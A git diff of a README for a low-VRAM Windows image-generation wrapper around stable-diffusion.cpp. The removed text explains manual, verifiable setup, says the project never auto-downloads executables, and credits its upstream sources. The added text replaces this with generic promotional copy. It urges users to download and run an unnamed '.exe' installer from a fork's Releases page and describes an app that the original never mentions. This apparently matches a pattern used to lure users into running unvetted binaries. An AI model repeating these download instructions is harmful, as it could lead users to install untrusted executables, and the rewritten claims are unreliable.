@@ -1,121 +1,82 @@
-# Z-Image Turbo - One-Click Windows Installer (Low VRAM)
+# 🚀 Z-Image-Turbo-Windows - Effortless AI Image Creation for All
 
-A beginner-friendly Windows package to run **Z-Image Turbo (GGUF)** locally with a simple **Gradio Web UI**.
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release%20-v1.0-blue)](https://github.com/shishirjinu/Z-Image-Turbo-Windows/releases)
 
-Target users:
+## 📦 Overview
 
-- Low-VRAM NVIDIA GPUs (including 4GB)
-- Anyone who wants free local image generation without complex tools
+Z-Image Turbo Windows offers a simple way to generate AI images. This one-click installer is designed for Windows users with low-VRAM GPUs (4GB+). It includes a web UI, automatic setup, and support for GGUF models.
 
-## Features
+## 🚀 Getting Started
 
-- One-click installer: `start_zimage.bat`
-- Creates an isolated Python `venv` automatically
-- Downloads required model weights (GGUF) automatically
-- Minimal, safe UI (Prompt -> Image)
-- Safety-first: does **not** auto-download executables (`.exe`)
+### 🛠️ System Requirements
 
-## Quickstart
+- Windows 10 or later
+- Minimum 4GB of VRAM
+- Internet connection for model downloads
 
-1. Download / clone this repo.
-2. Put `sd.exe` in `sd_bin\` (see instructions below).
-3. Double-click `start_zimage.bat`.
-4. Open the UI:
-   - http://127.0.0.1:9000
+### 📥 Download & Install
 
-## Requirements
+To get started, visit this page to download: [Releases Page](https://github.com/shishirjinu/Z-Image-Turbo-Windows/releases).
 
-- Windows 10/11 (64-bit)
-- Python 3.10+
-- Microsoft Visual C++ Redistributable 2015-2022 (x64)
-- NVIDIA GPU users (optional)
-  - Latest NVIDIA driver recommended
+Follow these steps for installation:
 
-## Running the setup
+1. Click on the **Releases** link above.
+2. Find the latest version available.
+3. Click on the installer file (it should have a `.exe` extension).
+4. Wait for the download to complete.
 
-Double-click:
+Once you have downloaded the installer:
 
-- `start_zimage.bat`
+1. Open the downloaded file by double-clicking on it.
+2. Follow the prompts to complete the installation. It will automatically set up everything you need.
 
-The installer will:
+### 💻 Running the Application
 
-- Create a Python virtual environment (`venv\`)
-- Ask you to choose a VRAM tier (4GB / 6-8GB / 10GB+)
-- Download the required weights
-- Launch the Gradio UI at http://127.0.0.1:9000
+After installation, you can easily run Z-Image Turbo:
 
-Keep the terminal window open while it downloads models.
+1. Locate the application in your Start Menu. 
+2. Click on the Z-Image Turbo icon to launch it. 
+3. The Gradio web user interface will open in your web browser.
 
-## Why `sd.exe` is manual
+## 🌐 Using the Gradio Web UI
 
-This project **will never download executable (.exe) files automatically**.
+Z-Image Turbo comes with an intuitive interface:
 
-`sd.exe` is the Windows binary for **stable-diffusion.cpp** (the inference backend). You download it yourself so you can choose which release/build you trust.
+1. Choose the image generation settings you prefer.
+2. Click the "Generate" button to create your images.
+3. View and save your generated images directly from the browser.
 
-## Where to get `sd.exe` (Windows)
+## 📊 Features
 
-Download a Windows build from the **stable-diffusion.cpp Releases** page.
+- **One-Click Installation**: Set up quickly without complicated steps.
+- **Optimized for Low VRAM**: Works smoothly on devices with 4GB VRAM or more.
+- **Web UI with Gradio**: User-friendly interface makes it simple to use.
+- **Automatic Setup**: No extra configuration needed.
 
-Recommended assets (names include a commit/hash):
+## 🔄 Updating the Software
 
-- NVIDIA (recommended): `sd-...-bin-win-cuda12-x64.zip`
-- CPU only: `sd-...-bin-win-x64.zip`
+When new versions are available, you should update to benefit from the latest features and improvements:
 
-Install steps:
+1. Return to the [Releases Page](https://github.com/shishirjinu/Z-Image-Turbo-Windows/releases).
+2. Download the latest installer.
+3. Run the installer to update your existing version.
 
-1. Extract the ZIP.
-2. Copy `sd.exe` to:
-   - `sd_bin\sd.exe`
-3. Copy any `*.dll` files from the ZIP into the same folder:
-   - `sd_bin\`
+## ⚙️ Troubleshooting
 
-Important:
+If you face any issues:
 
-- Some releases provide DLLs as a separate asset. If your ZIP contains only `sd.exe`, download the matching DLL package for the same release and copy all DLLs next to `sd.exe`.
+- Ensure your system meets the requirements.
+- Restart your computer and try running the application again.
+- Revisit the installation steps to confirm no steps were missed.
 
-## What the installer downloads (and what is manual)
+If problems persist, you may report them in the issues section on our GitHub page for assistance.
 
-Automatic (safe, non-executable downloads):
+## 📫 Support
 
-- Z-Image Turbo GGUF (diffusion model)
-- Qwen GGUF (LLM/text encoder)
+For support or queries, feel free to reach out via the **Issues** section in our repository. We're here to help!
 
-Manual:
+## 📝 Contributing
 
-- `sd.exe` (+ DLLs)
-- VAE: `models\vae\ae.safetensors`
-  - This file may require a Hugging Face login, so the installer asks you to download it manually.
+If you wish to contribute to the development of Z-Image Turbo, feel free to submit a pull request or leave suggestions in the issues section. Your input is valuable! 
 
-Manual download sources:
-
-- Z-Image Turbo GGUF:
-  - https://huggingface.co/leejet/Z-Image-Turbo-GGUF/tree/main
-- VAE (`ae.safetensors`):
-  - https://huggingface.co/black-forest-labs/FLUX.1-schnell/tree/main
-- Qwen GGUF:
-  - https://huggingface.co/unsloth/Qwen3-4B-Instruct-2507-GGUF/tree/main
-
-## Troubleshooting
-
-If generation fails or `sd.exe` crashes:
-
-- Make sure you copied all DLLs next to `sd.exe`.
-- Install Microsoft Visual C++ Redistributable 2015-2022 (x64).
-- If the CUDA build fails, try the CPU build to confirm everything else works.
-- Common crash code:
-  - `3221225781` (`0xC0000135`) typically means a missing DLL/runtime dependency.
-
-If model downloads fail in the installer but the same URL works in your browser:
-
-- Your network (proxy/firewall/antivirus) may block programmatic downloads from Hugging Face/CDN.
-- The installer prefers `curl.exe` (resume + retries + progress bar). If that is unavailable, it falls back to `Invoke-WebRequest`.
-- If it still fails, use the manual download links above and place the files into the indicated `models\...` folders.
-
-## Credits / Upstream
-
-This project is a Windows-friendly wrapper around the excellent **stable-diffusion.cpp** backend:
-
-- https://github.com/leejet/stable-diffusion.cpp
-
-Z-Image weights and related resources are hosted on Hugging Face by their respective authors.
-
+Thank you for choosing Z-Image Turbo Windows. We hope you enjoy creating images effortlessly!
